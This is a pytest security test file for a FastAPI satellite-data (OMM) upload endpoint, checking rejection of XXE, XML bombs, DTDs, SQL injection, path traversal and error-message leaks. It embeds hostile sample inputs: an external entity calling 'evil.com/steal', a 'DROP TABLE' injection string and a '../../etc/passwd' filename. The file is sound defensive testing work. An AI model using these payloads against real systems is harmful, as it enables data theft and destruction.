"""
Security tests for OMM upload endpoint.

Tests XXE attacks, XML bombs, and input validation.
"""
import pytest
from fastapi.testclient import TestClient
from unittest.mock import patch, AsyncMock

from app.main import app


client = TestClient(app)


class TestXMLSecurity:
    """Test XML security (XXE, bombs, etc.)."""
    
    def test_xxe_attack_blocked(self, sample_malicious_xml):
        """Test XXE (XML External Entity) attack is blocked."""
        files = {"file": ("malicious.xml", sample_malicious_xml, "application/xml")}
        data = {"format": "xml", "source": "test"}
        
        response = client.post("/api/v1/satellites/omm", files=files, data=data)
        
        # Should reject malicious XML
        assert response.status_code in [400, 503]  # Bad request or service unavailable
        
        # Should NOT contain /etc/passwd content
        if response.status_code == 200:
            assert "root:x:" not in response.text
    
    def test_xml_bomb_blocked(self, sample_xml_bomb):
        """Test XML bomb (billion laughs) is blocked."""
        files = {"file": ("bomb.xml", sample_xml_bomb, "application/xml")}
        data = {"format": "xml", "source": "test"}
        
        response = client.post("/api/v1/satellites/omm", files=files, data=data)
        
        # Should reject or timeout
        assert response.status_code in [400, 413, 503, 504]
    
    def test_dtd_forbidden(self):
        """Test DTD (Document Type Definition) is forbidden."""
        xml_with_dtd = """<?xml version="1.0"?>
<!DOCTYPE omm [<!ELEMENT omm ANY>]>
<omm><data>test</data></omm>"""
        
        files = {"file": ("dtd.xml", xml_with_dtd, "application/xml")}
        data = {"format": "xml", "source": "test"}
        
        response = client.post("/api/v1/satellites/omm", files=files, data=data)
        
        # Should reject DTD
        assert response.status_code in [400, 503]
    
    def test_external_entities_forbidden(self):
        """Test external entities are forbidden."""
        xml_with_entity = """<?xml version="1.0"?>
<!DOCTYPE omm [
  <!ENTITY external SYSTEM "http://evil.com/steal">
]>
<omm>&external;</omm>"""
        
        files = {"file": ("entity.xml", xml_with_entity, "application/xml")}
        data = {"format": "xml", "source": "test"}
        
        response = client.post("/api/v1/satellites/omm", files=files, data=data)
        
        # Should reject
        assert response.status_code in [400, 503]


class TestInputValidation:
    """Test input validation on OMM upload."""
    
    def test_file_size_limit(self):
        """Test file size is limited (10MB max)."""
        # Create 15MB file
        large_content = "x" * (15 * 1024 * 1024)
        files = {"file": ("large.xml", large_content, "application/xml")}
        data = {"format": "xml", "source": "test"}
        
        response = client.post("/api/v1/satellites/omm", files=files, data=data)
        
        # Should reject
        assert response.status_code == 413  # Payload too large
    
    def test_invalid_encoding(self):
        """Test non-UTF-8 encoding is rejected."""
        # Latin-1 encoded content
        content = b"<?xml version='1.0' encoding='latin-1'?><omm>\xe9</omm>"
        files = {"file": ("latin1.xml", content, "application/xml")}
        data = {"format": "xml", "source": "test"}
        
        response = client.post("/api/v1/satellites/omm", files=files, data=data)
        
        # Should reject or handle gracefully
        assert response.status_code in [400, 503]
    
    def test_empty_file(self):
        """Test empty file is rejected."""
        files = {"file": ("empty.xml", "", "application/xml")}
        data = {"format": "xml", "source": "test"}
        
        response = client.post("/api/v1/satellites/omm", files=files, data=data)
        
        assert response.status_code in [400, 503]
    
    def test_invalid_xml(self):
        """Test malformed XML is rejected."""
        invalid_xml = "<?xml version='1.0'?><omm><unclosed>"
        files = {"file": ("invalid.xml", invalid_xml, "application/xml")}
        data = {"format": "xml", "source": "test"}
        
        response = client.post("/api/v1/satellites/omm", files=files, data=data)
        
        assert response.status_code in [400, 503]
    
    def test_non_omm_xml(self):
        """Test non-OMM XML is rejected."""
        non_omm = """<?xml version='1.0'?>
<root><data>not an OMM file</data></root>"""
        files = {"file": ("not_omm.xml", non_omm, "application/xml")}
        data = {"format": "xml", "source": "test"}
        
        response = client.post("/api/v1/satellites/omm", files=files, data=data)
        
        assert response.status_code in [400, 503]


class TestRateLimiting:
    """Test rate limiting on OMM endpoint."""
    
    def test_rate_limit_enforced(self, sample_omm_xml):
        """Test rate limit (10/minute) is enforced."""
        files = {"file": ("test.xml", sample_omm_xml, "application/xml")}
        data = {"format": "xml", "source": "test"}
        
        # Send 15 requests (exceeds 10/min limit)
        responses = []
        for _ in range(15):
            response = client.post("/api/v1/satellites/omm", files=files, data=data)
            responses.append(response.status_code)
        
        # At least one should be rate-limited
        assert 429 in responses  # Too many requests


@pytest.mark.security
class TestAuthentication:
    """Test API authentication (when enabled)."""
    
    def test_missing_api_key(self, sample_omm_xml):
        """Test request without API key is handled."""
        # If API key auth is enabled, this should fail
        # Currently rate limiting is IP-based, so this is informational
        pass
    
    def test_invalid_api_key(self):
        """Test invalid API key is rejected."""
        # TODO: Implement when API key auth is added
        pass


@pytest.mark.security
class TestSQLInjection:
    """Test SQL injection prevention."""
    
    def test_sql_injection_in_source(self, sample_omm_xml):
        """Test SQL injection in source parameter."""
        files = {"file": ("test.xml", sample_omm_xml, "application/xml")}
        data = {
            "format": "xml",
            "source": "'; DROP TABLE satellites; --"
        }
        
        response = client.post("/api/v1/satellites/omm", files=files, data=data)
        
        # Should handle safely (parameterized queries or sanitization)
        # Not inject into database
        assert response.status_code in [200, 400, 503]


@pytest.mark.security
class TestPathTraversal:
    """Test path traversal attacks."""
    
    def test_path_traversal_in_filename(self, sample_omm_xml):
        """Test path traversal in filename."""
        files = {"file": ("../../etc/passwd", sample_omm_xml, "application/xml")}
        data = {"format": "xml", "source": "test"}
        
        response = client.post("/api/v1/satellites/omm", files=files, data=data)
        
        # Should handle safely
        assert response.status_code in [200, 400, 503]


@pytest.mark.security
class TestDenialOfService:
    """Test DoS prevention."""
    
    def test_nested_xml_depth(self):
        """Test deeply nested XML is rejected."""
        # Create 1000-level deep XML
        xml = "<?xml version='1.0'?>"
        xml += "<omm>" * 1000
        xml += "data"
        xml += "</omm>" * 1000
        
        files = {"file": ("deep.xml", xml, "application/xml")}
        data = {"format": "xml", "source": "test"}
        
        response = client.post("/api/v1/satellites/omm", files=files, data=data)
        
        # Should reject or timeout
        assert response.status_code in [400, 413, 503, 504]
    
    def test_many_attributes(self):
        """Test XML with excessive attributes is rejected."""
        xml = "<?xml version='1.0'?><omm "
        xml += " ".join([f"attr{i}='value'" for i in range(10000)])
        xml += ">data</omm>"
        
        files = {"file": ("attrs.xml", xml, "application/xml")}
        data = {"format": "xml", "source": "test"}
        
        response = client.post("/api/v1/satellites/omm", files=files, data=data)
        
        assert response.status_code in [400, 413, 503]


@pytest.mark.security
class TestInformationDisclosure:
    """Test information disclosure prevention."""
    
    def test_error_messages_no_stack_trace(self):
        """Test error messages don't leak stack traces."""
        files = {"file": ("error.xml", "invalid", "application/xml")}
        data = {"format": "xml", "source": "test"}
        
        response = client.post("/api/v1/satellites/omm", files=files, data=data)
        
        # Should not contain stack traces or internal paths
        assert "Traceback" not in response.text
        assert "/home/" not in response.text
        assert "File \"" not in response.text
    
    def test_error_messages_no_version_info(self):
        """Test error messages don't leak version info."""
        files = {"file": ("error.xml", "invalid", "application/xml")}
        data = {"format": "xml", "source": "test"}
        
        response = client.post("/api/v1/satellites/omm", files=files, data=data)
        
        # Should not contain version strings
        assert "Python" not in response.text
        assert "FastAPI" not in response.text
